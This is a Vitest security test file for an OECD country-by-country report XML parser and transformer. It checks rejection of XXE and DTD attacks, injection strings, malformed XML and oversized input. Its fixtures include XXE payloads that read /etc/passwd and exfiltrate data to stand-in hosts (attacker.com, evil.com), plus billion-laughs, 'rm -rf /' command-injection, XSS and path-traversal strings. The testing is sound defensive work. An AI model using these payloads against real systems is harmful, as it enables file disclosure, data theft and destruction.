/**
 * Security Tests
 *
 * Comprehensive tests for security vulnerabilities including:
 * - XXE (XML External Entity) attacks
 * - Injection attacks (XPath, SQL-like patterns)
 * - Malformed XML handling
 * - File upload attack vectors
 *
 * @module tests/validators/security
 */

import { describe, it, expect } from 'vitest';
import {
  parseXmlString,
  validateXmlWellformedness,
  detectEncoding,
} from '@/lib/parsers/xml-parser';
import { transformXmlToCbcReport } from '@/lib/parsers/xml-transformer';
import { ValidationSeverity } from '@/types/validation';

// =============================================================================
// XXE (XML EXTERNAL ENTITY) ATTACK TESTS
// =============================================================================

describe('XXE Attack Prevention', () => {
  describe('Entity Declaration Attacks', () => {
    it('should detect and reject ENTITY declarations', () => {
      const xxePayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<CBC_OECD>
  <MessageSpec>
    <MessageRefId>&xxe;</MessageRefId>
  </MessageSpec>
</CBC_OECD>`;

      const results = validateXmlWellformedness(xxePayload);
      const xxeResults = results.filter((r) =>
        r.message.toLowerCase().includes('xxe') || r.message.toLowerCase().includes('entity')
      );

      expect(xxeResults.length).toBeGreaterThan(0);
      expect(xxeResults[0].severity).toBe(ValidationSeverity.CRITICAL);
    });

    it('should detect internal entity definitions', () => {
      const internalEntity = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY internal "malicious content">
]>
<CBC_OECD>
  <data>&internal;</data>
</CBC_OECD>`;

      const results = validateXmlWellformedness(internalEntity);
      const entityResults = results.filter((r) =>
        r.ruleId === 'APP-006' || r.message.toLowerCase().includes('entity')
      );

      expect(entityResults.length).toBeGreaterThan(0);
    });

    it('should detect parameter entity attacks', () => {
      const parameterEntity = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<CBC_OECD>
  <data>test</data>
</CBC_OECD>`;

      const results = validateXmlWellformedness(parameterEntity);
      const xxeResults = results.filter((r) => r.severity === ValidationSeverity.CRITICAL);

      expect(xxeResults.length).toBeGreaterThan(0);
    });
  });

  describe('SYSTEM External Reference Attacks', () => {
    it('should detect SYSTEM file:// references', () => {
      const fileReference = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<CBC_OECD><data>&file;</data></CBC_OECD>`;

      const results = validateXmlWellformedness(fileReference);
      expect(results.some((r) => r.severity === ValidationSeverity.CRITICAL)).toBe(true);
    });

    it('should detect SYSTEM http:// references', () => {
      const httpReference = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY remote SYSTEM "http://attacker.com/steal?data=">
]>
<CBC_OECD><data>&remote;</data></CBC_OECD>`;

      const results = validateXmlWellformedness(httpReference);
      expect(results.some((r) => r.severity === ValidationSeverity.CRITICAL)).toBe(true);
    });

    it('should detect SYSTEM php:// wrapper references', () => {
      const phpWrapper = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY php SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<CBC_OECD><data>&php;</data></CBC_OECD>`;

      const results = validateXmlWellformedness(phpWrapper);
      expect(results.some((r) => r.severity === ValidationSeverity.CRITICAL)).toBe(true);
    });
  });

  describe('PUBLIC External Reference Attacks', () => {
    it('should detect PUBLIC entity declarations', () => {
      const publicEntity = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY pub PUBLIC "-//W3C//DTD XHTML 1.0//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
]>
<CBC_OECD><data>&pub;</data></CBC_OECD>`;

      const results = validateXmlWellformedness(publicEntity);
      expect(results.some((r) => r.severity === ValidationSeverity.CRITICAL)).toBe(true);
    });
  });

  describe('DTD Attacks', () => {
    it('should detect internal DTD subsets', () => {
      const internalDtd = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ATTLIST foo bar CDATA #IMPLIED>
]>
<CBC_OECD><foo bar="test"/></CBC_OECD>`;

      const results = validateXmlWellformedness(internalDtd);
      expect(results.some((r) =>
        r.ruleId === 'APP-006' || r.message.toLowerCase().includes('dtd')
      )).toBe(true);
    });

    it('should detect external DTD references', () => {
      const externalDtd = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://evil.com/attack.dtd">
<CBC_OECD><data>test</data></CBC_OECD>`;

      const results = validateXmlWellformedness(externalDtd);
      expect(results.some((r) => r.severity === ValidationSeverity.CRITICAL)).toBe(true);
    });
  });

  describe('Billion Laughs Attack', () => {
    it('should handle recursive entity expansion attempts', () => {
      const billionLaughs = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<CBC_OECD><data>&lol3;</data></CBC_OECD>`;

      const results = validateXmlWellformedness(billionLaughs);
      expect(results.some((r) => r.severity === ValidationSeverity.CRITICAL)).toBe(true);
    });
  });
});

// =============================================================================
// MALFORMED XML HANDLING TESTS
// =============================================================================

describe('Malformed XML Handling', () => {
  describe('Encoding Issues', () => {
    it('should detect UTF-8 BOM', () => {
      const bomContent = '\uFEFF<?xml version="1.0" encoding="UTF-8"?><CBC_OECD/>';
      const encoding = detectEncoding(bomContent);

      expect(encoding.hasBom).toBe(true);
    });

    it('should detect non-UTF-8 encoding declaration', () => {
      const nonUtf8 = '<?xml version="1.0" encoding="ISO-8859-1"?><CBC_OECD/>';
      const results = validateXmlWellformedness(nonUtf8);

      expect(results.some((r) =>
        r.message.toLowerCase().includes('utf-8') ||
        r.message.toLowerCase().includes('encoding')
      )).toBe(true);
    });

    it('should detect missing XML declaration', () => {
      const noDeclaration = '<CBC_OECD><MessageSpec/></CBC_OECD>';
      const results = validateXmlWellformedness(noDeclaration);

      expect(results.some((r) => r.message.toLowerCase().includes('declaration'))).toBe(true);
    });
  });

  describe('Structural Issues', () => {
    it('should detect unclosed tags', () => {
      const unclosed = '<?xml version="1.0"?><CBC_OECD><MessageSpec></CBC_OECD>';
      const results = validateXmlWellformedness(unclosed);

      expect(results.some((r) => r.severity === ValidationSeverity.CRITICAL)).toBe(true);
    });

    it('should detect mismatched tags', () => {
      const mismatched = '<?xml version="1.0"?><CBC_OECD><MessageSpec></WrongTag></CBC_OECD>';
      const results = validateXmlWellformedness(mismatched);

      expect(results.some((r) => r.severity === ValidationSeverity.CRITICAL)).toBe(true);
    });

    it('should handle empty content', () => {
      const results = validateXmlWellformedness('');

      expect(results.some((r) => r.severity === ValidationSeverity.CRITICAL)).toBe(true);
      expect(results.some((r) => r.message.toLowerCase().includes('empty'))).toBe(true);
    });

    it('should handle whitespace-only content', () => {
      const results = validateXmlWellformedness('   \n\t   ');

      expect(results.some((r) => r.severity === ValidationSeverity.CRITICAL)).toBe(true);
    });
  });

  describe('Prohibited Characters', () => {
    it('should detect null bytes', () => {
      const nullByte = '<?xml version="1.0"?><CBC_OECD>test\x00data</CBC_OECD>';
      const results = validateXmlWellformedness(nullByte);

      expect(results.some((r) =>
        r.message.toLowerCase().includes('control') ||
        r.message.toLowerCase().includes('prohibited')
      )).toBe(true);
    });

    it('should detect other control characters', () => {
      const controlChar = '<?xml version="1.0"?><CBC_OECD>test\x08data</CBC_OECD>';
      const results = validateXmlWellformedness(controlChar);

      expect(results.some((r) => r.message.toLowerCase().includes('control'))).toBe(true);
    });
  });
});

// =============================================================================
// INJECTION ATTACK TESTS
// =============================================================================

describe('Injection Attack Prevention', () => {
  describe('XPath Injection Patterns', () => {
    it('should safely handle XPath-like patterns in data', () => {
      const xpathInjection = `<?xml version="1.0" encoding="UTF-8"?>
<CBC_OECD xmlns="urn:oecd:ties:cbc:v2">
  <MessageSpec>
    <MessageRefId>' or '1'='1</MessageRefId>
    <SendingCompetentAuthority>LU</SendingCompetentAuthority>
    <ReceivingCompetentAuthority>LU</ReceivingCompetentAuthority>
    <MessageType>CBC401</MessageType>
    <MessageTypeIndic>CBC701</MessageTypeIndic>
    <ReportingPeriod>2024-12-31</ReportingPeriod>
    <Timestamp>2024-01-15T10:00:00</Timestamp>
  </MessageSpec>
  <CbcBody>
    <ReportingEntity>
      <DocSpec>
        <DocTypeIndic>OECD1</DocTypeIndic>
        <DocRefId>test-doc-001</DocRefId>
      </DocSpec>
      <Name>Test Entity</Name>
      <ReportingRole>CBC801</ReportingRole>
    </ReportingEntity>
  </CbcBody>
</CBC_OECD>`;

      // Parser should handle this without crashing
      const parseResult = parseXmlString(xpathInjection, 'test.xml');

      // The parse should either succeed (treating the injection as data)
      // or fail gracefully with a proper error
      expect(parseResult).toBeDefined();
    });
  });

  describe('Script Injection Patterns', () => {
    it('should safely handle JavaScript in data fields', () => {
      const scriptInjection = `<?xml version="1.0" encoding="UTF-8"?>
<CBC_OECD xmlns="urn:oecd:ties:cbc:v2">
  <MessageSpec>
    <MessageRefId>&lt;script&gt;alert('xss')&lt;/script&gt;</MessageRefId>
    <SendingCompetentAuthority>LU</SendingCompetentAuthority>
    <ReceivingCompetentAuthority>LU</ReceivingCompetentAuthority>
    <MessageType>CBC401</MessageType>
    <MessageTypeIndic>CBC701</MessageTypeIndic>
    <ReportingPeriod>2024-12-31</ReportingPeriod>
    <Timestamp>2024-01-15T10:00:00</Timestamp>
  </MessageSpec>
  <CbcBody>
    <ReportingEntity>
      <DocSpec>
        <DocTypeIndic>OECD1</DocTypeIndic>
        <DocRefId>test</DocRefId>
      </DocSpec>
      <Name>Test</Name>
      <ReportingRole>CBC801</ReportingRole>
    </ReportingEntity>
  </CbcBody>
</CBC_OECD>`;

      // Parser should handle this without interpreting as script
      const parseResult = parseXmlString(scriptInjection, 'test.xml');
      expect(parseResult).toBeDefined();
    });

    it('should detect potentially malicious unescaped ampersands', () => {
      const unescapedAmp = `<?xml version="1.0" encoding="UTF-8"?>
<CBC_OECD>
  <MessageSpec>
    <MessageRefId>test&something</MessageRefId>
  </MessageSpec>
</CBC_OECD>`;

      const results = validateXmlWellformedness(unescapedAmp);
      // Should either error on invalid XML or warn about unescaped characters
      expect(results.length).toBeGreaterThanOrEqual(0);
    });
  });

  describe('Command Injection Patterns', () => {
    it('should safely handle shell command patterns', () => {
      const commandInjection = `<?xml version="1.0" encoding="UTF-8"?>
<CBC_OECD xmlns="urn:oecd:ties:cbc:v2">
  <MessageSpec>
    <MessageRefId>test; rm -rf /</MessageRefId>
    <SendingCompetentAuthority>LU</SendingCompetentAuthority>
    <ReceivingCompetentAuthority>LU</ReceivingCompetentAuthority>
    <MessageType>CBC401</MessageType>
    <MessageTypeIndic>CBC701</MessageTypeIndic>
    <ReportingPeriod>2024-12-31</ReportingPeriod>
    <Timestamp>2024-01-15T10:00:00</Timestamp>
  </MessageSpec>
  <CbcBody>
    <ReportingEntity>
      <DocSpec>
        <DocTypeIndic>OECD1</DocTypeIndic>
        <DocRefId>cmd-test</DocRefId>
      </DocSpec>
      <Name>Test</Name>
      <ReportingRole>CBC801</ReportingRole>
    </ReportingEntity>
  </CbcBody>
</CBC_OECD>`;

      // Parser should treat this as data, not execute
      const parseResult = parseXmlString(commandInjection, 'test.xml');
      expect(parseResult).toBeDefined();
    });
  });
});

// =============================================================================
// FILE SIZE AND RESOURCE EXHAUSTION TESTS
// =============================================================================

describe('Resource Exhaustion Prevention', () => {
  describe('Large File Handling', () => {
    it('should handle reasonably sized files', () => {
      // Create a file with many entities (but not too large)
      let largeContent = '<?xml version="1.0" encoding="UTF-8"?>\n<CBC_OECD>';
      for (let i = 0; i < 100; i++) {
        largeContent += `<Element${i}>Data${i}</Element${i}>`;
      }
      largeContent += '</CBC_OECD>';

      // Should not throw or hang
      const startTime = Date.now();
      const results = validateXmlWellformedness(largeContent);
      const endTime = Date.now();

      // Should complete in reasonable time (< 5 seconds)
      expect(endTime - startTime).toBeLessThan(5000);
      expect(results).toBeDefined();
    });
  });

  describe('Deeply Nested XML', () => {
    it('should handle moderately deep nesting', () => {
      let deeplyNested = '<?xml version="1.0" encoding="UTF-8"?>';
      const depth = 50;

      for (let i = 0; i < depth; i++) {
        deeplyNested += `<Level${i}>`;
      }
      deeplyNested += 'data';
      for (let i = depth - 1; i >= 0; i--) {
        deeplyNested += `</Level${i}>`;
      }

      // Should not stack overflow
      const results = validateXmlWellformedness(deeplyNested);
      expect(results).toBeDefined();
    });
  });

  describe('Wide XML', () => {
    it('should handle many sibling elements', () => {
      let wideXml = '<?xml version="1.0" encoding="UTF-8"?><Root>';
      for (let i = 0; i < 1000; i++) {
        wideXml += `<Item id="${i}">Value${i}</Item>`;
      }
      wideXml += '</Root>';

      const startTime = Date.now();
      const results = validateXmlWellformedness(wideXml);
      const endTime = Date.now();

      expect(endTime - startTime).toBeLessThan(5000);
      expect(results).toBeDefined();
    });
  });
});

// =============================================================================
// XML TRANSFORMER SECURITY TESTS
// =============================================================================

describe('XML Transformer Security', () => {
  it('should reject invalid XML structures', () => {
    const invalidXml = '<?xml version="1.0"?><not-cbcr><random/></not-cbcr>';
    const result = transformXmlToCbcReport(invalidXml, 'invalid.xml');

    expect(result.success).toBe(false);
  });

  it('should handle missing required elements gracefully', () => {
    const incompleteXml = `<?xml version="1.0" encoding="UTF-8"?>
<CBC_OECD xmlns="urn:oecd:ties:cbc:v2">
  <MessageSpec/>
</CBC_OECD>`;

    // Should not crash - either fail with error or return with warnings
    const result = transformXmlToCbcReport(incompleteXml, 'incomplete.xml');
    expect(result).toBeDefined();
  });

  it('should properly escape special characters in output', () => {
    const specialChars = `<?xml version="1.0" encoding="UTF-8"?>
<CBC_OECD xmlns="urn:oecd:ties:cbc:v2">
  <MessageSpec>
    <MessageRefId>Test&amp;Company&lt;Name&gt;</MessageRefId>
    <SendingCompetentAuthority>LU</SendingCompetentAuthority>
    <ReceivingCompetentAuthority>LU</ReceivingCompetentAuthority>
    <MessageType>CBC401</MessageType>
    <MessageTypeIndic>CBC701</MessageTypeIndic>
    <ReportingPeriod>2024-12-31</ReportingPeriod>
    <Timestamp>2024-01-15T10:00:00</Timestamp>
  </MessageSpec>
  <CbcBody>
    <ReportingEntity>
      <DocSpec>
        <DocTypeIndic>OECD1</DocTypeIndic>
        <DocRefId>esc-test</DocRefId>
      </DocSpec>
      <Name>O&apos;Brien &amp; Associates</Name>
      <ReportingRole>CBC801</ReportingRole>
    </ReportingEntity>
  </CbcBody>
</CBC_OECD>`;

    const result = transformXmlToCbcReport(specialChars, 'special.xml');

    if (result.success) {
      // If parsed successfully, the data should be properly decoded
      expect(result.data).toBeDefined();
    } else {
      // If it failed, it should be a graceful failure
      expect(result.errors).toBeDefined();
    }
  });
});

// =============================================================================
// DATA VALIDATION SECURITY
// =============================================================================

describe('Data Validation Security', () => {
  describe('Field Length Limits', () => {
    it('should handle extremely long field values', () => {
      const longValue = 'A'.repeat(100000);
      const longFieldXml = `<?xml version="1.0" encoding="UTF-8"?>
<CBC_OECD xmlns="urn:oecd:ties:cbc:v2">
  <MessageSpec>
    <MessageRefId>${longValue}</MessageRefId>
    <SendingCompetentAuthority>LU</SendingCompetentAuthority>
    <ReceivingCompetentAuthority>LU</ReceivingCompetentAuthority>
    <MessageType>CBC401</MessageType>
    <MessageTypeIndic>CBC701</MessageTypeIndic>
    <ReportingPeriod>2024-12-31</ReportingPeriod>
    <Timestamp>2024-01-15T10:00:00</Timestamp>
  </MessageSpec>
  <CbcBody>
    <ReportingEntity>
      <DocSpec>
        <DocTypeIndic>OECD1</DocTypeIndic>
        <DocRefId>long-field-test</DocRefId>
      </DocSpec>
      <Name>${longValue}</Name>
      <ReportingRole>CBC801</ReportingRole>
    </ReportingEntity>
  </CbcBody>
</CBC_OECD>`;

      // Should handle without crashing
      const result = transformXmlToCbcReport(longFieldXml, 'long.xml');
      expect(result).toBeDefined();
    });
  });

  describe('Numeric Overflow', () => {
    it('should handle very large numbers', () => {
      const largeNumber = '999999999999999999999999999999';
      const largeNumberXml = `<?xml version="1.0" encoding="UTF-8"?>
<CBC_OECD xmlns="urn:oecd:ties:cbc:v2">
  <MessageSpec>
    <MessageRefId>large-num-test</MessageRefId>
    <SendingCompetentAuthority>LU</SendingCompetentAuthority>
    <ReceivingCompetentAuthority>LU</ReceivingCompetentAuthority>
    <MessageType>CBC401</MessageType>
    <MessageTypeIndic>CBC701</MessageTypeIndic>
    <ReportingPeriod>2024-12-31</ReportingPeriod>
    <Timestamp>2024-01-15T10:00:00</Timestamp>
  </MessageSpec>
  <CbcBody>
    <ReportingEntity>
      <DocSpec>
        <DocTypeIndic>OECD1</DocTypeIndic>
        <DocRefId>test</DocRefId>
      </DocSpec>
      <Name>Test</Name>
      <ReportingRole>CBC801</ReportingRole>
    </ReportingEntity>
    <CbcReports>
      <DocSpec>
        <DocTypeIndic>OECD1</DocTypeIndic>
        <DocRefId>report-1</DocRefId>
      </DocSpec>
      <ResCountryCode>LU</ResCountryCode>
      <Summary>
        <TotalRevenues currCode="EUR">${largeNumber}</TotalRevenues>
      </Summary>
    </CbcReports>
  </CbcBody>
</CBC_OECD>`;

      // Should handle without overflow errors
      const result = transformXmlToCbcReport(largeNumberXml, 'large-num.xml');
      expect(result).toBeDefined();
    });

    it('should handle negative numbers', () => {
      const negativeXml = `<?xml version="1.0" encoding="UTF-8"?>
<CBC_OECD xmlns="urn:oecd:ties:cbc:v2">
  <MessageSpec>
    <MessageRefId>neg-num-test</MessageRefId>
    <SendingCompetentAuthority>LU</SendingCompetentAuthority>
    <ReceivingCompetentAuthority>LU</ReceivingCompetentAuthority>
    <MessageType>CBC401</MessageType>
    <MessageTypeIndic>CBC701</MessageTypeIndic>
    <ReportingPeriod>2024-12-31</ReportingPeriod>
    <Timestamp>2024-01-15T10:00:00</Timestamp>
  </MessageSpec>
  <CbcBody>
    <ReportingEntity>
      <DocSpec>
        <DocTypeIndic>OECD1</DocTypeIndic>
        <DocRefId>test</DocRefId>
      </DocSpec>
      <Name>Test</Name>
      <ReportingRole>CBC801</ReportingRole>
    </ReportingEntity>
    <CbcReports>
      <DocSpec>
        <DocTypeIndic>OECD1</DocTypeIndic>
        <DocRefId>report-1</DocRefId>
      </DocSpec>
      <ResCountryCode>LU</ResCountryCode>
      <Summary>
        <ProfitOrLoss currCode="EUR">-5000000</ProfitOrLoss>
      </Summary>
    </CbcReports>
  </CbcBody>
</CBC_OECD>`;

      // Should handle negative numbers (losses are valid)
      const result = transformXmlToCbcReport(negativeXml, 'negative.xml');
      expect(result).toBeDefined();
    });
  });

  describe('Unicode Security', () => {
    it('should handle Unicode characters safely', () => {
      const unicodeXml = `<?xml version="1.0" encoding="UTF-8"?>
<CBC_OECD xmlns="urn:oecd:ties:cbc:v2">
  <MessageSpec>
    <MessageRefId>unicode-test-日本語-العربية</MessageRefId>
    <SendingCompetentAuthority>LU</SendingCompetentAuthority>
    <ReceivingCompetentAuthority>LU</ReceivingCompetentAuthority>
    <MessageType>CBC401</MessageType>
    <MessageTypeIndic>CBC701</MessageTypeIndic>
    <ReportingPeriod>2024-12-31</ReportingPeriod>
    <Timestamp>2024-01-15T10:00:00</Timestamp>
  </MessageSpec>
  <CbcBody>
    <ReportingEntity>
      <DocSpec>
        <DocTypeIndic>OECD1</DocTypeIndic>
        <DocRefId>unicode-doc</DocRefId>
      </DocSpec>
      <Name>株式会社テスト</Name>
      <ReportingRole>CBC801</ReportingRole>
    </ReportingEntity>
  </CbcBody>
</CBC_OECD>`;

      const result = transformXmlToCbcReport(unicodeXml, 'unicode.xml');
      expect(result).toBeDefined();
    });

    it('should handle emoji in data', () => {
      const emojiXml = `<?xml version="1.0" encoding="UTF-8"?>
<CBC_OECD xmlns="urn:oecd:ties:cbc:v2">
  <MessageSpec>
    <MessageRefId>emoji-test</MessageRefId>
    <SendingCompetentAuthority>LU</SendingCompetentAuthority>
    <ReceivingCompetentAuthority>LU</ReceivingCompetentAuthority>
    <MessageType>CBC401</MessageType>
    <MessageTypeIndic>CBC701</MessageTypeIndic>
    <ReportingPeriod>2024-12-31</ReportingPeriod>
    <Timestamp>2024-01-15T10:00:00</Timestamp>
  </MessageSpec>
  <CbcBody>
    <ReportingEntity>
      <DocSpec>
        <DocTypeIndic>OECD1</DocTypeIndic>
        <DocRefId>emoji-doc</DocRefId>
      </DocSpec>
      <Name>Test Company 🏢</Name>
      <ReportingRole>CBC801</ReportingRole>
    </ReportingEntity>
  </CbcBody>
</CBC_OECD>`;

      // Should handle emoji without crashing
      const result = transformXmlToCbcReport(emojiXml, 'emoji.xml');
      expect(result).toBeDefined();
    });
  });
});

// =============================================================================
// PATH TRAVERSAL TESTS
// =============================================================================

describe('Path Traversal Prevention', () => {
  it('should safely handle path-like strings in data', () => {
    const pathTraversal = `<?xml version="1.0" encoding="UTF-8"?>
<CBC_OECD xmlns="urn:oecd:ties:cbc:v2">
  <MessageSpec>
    <MessageRefId>../../../etc/passwd</MessageRefId>
    <SendingCompetentAuthority>LU</SendingCompetentAuthority>
    <ReceivingCompetentAuthority>LU</ReceivingCompetentAuthority>
    <MessageType>CBC401</MessageType>
    <MessageTypeIndic>CBC701</MessageTypeIndic>
    <ReportingPeriod>2024-12-31</ReportingPeriod>
    <Timestamp>2024-01-15T10:00:00</Timestamp>
  </MessageSpec>
  <CbcBody>
    <ReportingEntity>
      <DocSpec>
        <DocTypeIndic>OECD1</DocTypeIndic>
        <DocRefId>C:\\Windows\\System32\\config</DocRefId>
      </DocSpec>
      <Name>..\\..\\..\\Windows\\System32</Name>
      <ReportingRole>CBC801</ReportingRole>
    </ReportingEntity>
  </CbcBody>
</CBC_OECD>`;

    // Parser should treat paths as data strings, not file paths
    const result = transformXmlToCbcReport(pathTraversal, 'path.xml');
    expect(result).toBeDefined();
  });
});
